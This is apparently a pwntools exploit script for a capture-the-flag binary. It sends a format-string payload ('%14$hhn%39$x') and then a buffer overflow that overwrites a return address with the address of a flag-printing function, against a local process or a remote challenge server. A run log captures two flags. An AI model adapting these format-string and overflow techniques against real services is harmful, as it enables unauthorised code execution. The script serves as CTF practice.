#!/usr/bin/env python
from pwn import *

password = "this_is_a_very_long_password_i_bet_you_can't_even_enter_all_of_it"

#p = process(['./tbd']) if '--live' not in sys.argv else remote('18.181.0.76', 7777)
p = process(['./tbd2']) if '--live' not in sys.argv else remote('18.181.0.76', 7777)

p.sendline('%14$hhn%39$x')

r = 'Checking ([0-9a-f]*) against'
s = p.recvregex(r)
#cookie = re.findall(r, s)[0].decode('hex')
#print('cookie: %r' % (cookie,))

#catflag2 = 0x08048a68
catflag2 = 0x0804898c
#p.sendline(password[:32]+cookie[::-1]+p32(catflag2)*((0x36-36)/4))
p.sendline(password[:32]+p32(catflag2)*((0x36-32)/4))

p.interactive()

'''
:!python exploit_tbd.py --live
[+] Opening connection to 18.181.0.76 on port 7777: Done
[*] Switching to interactive mode
 the master password...

OK, that was easy... have some pity points
flag{f0rm4t_u4_str1ngs}
Let's try one more.
password> this_is_a_very_long_password_i_b\x8c\x89^H\x8c\x89^H\x8c\x89^H\x8c\x89^H\x8c\x89^H

FAIL! \x8c != e
MAIN OUT 35212
flag{meowmeowmeowme0w}
[*] Got EOF while reading in interactive
'''
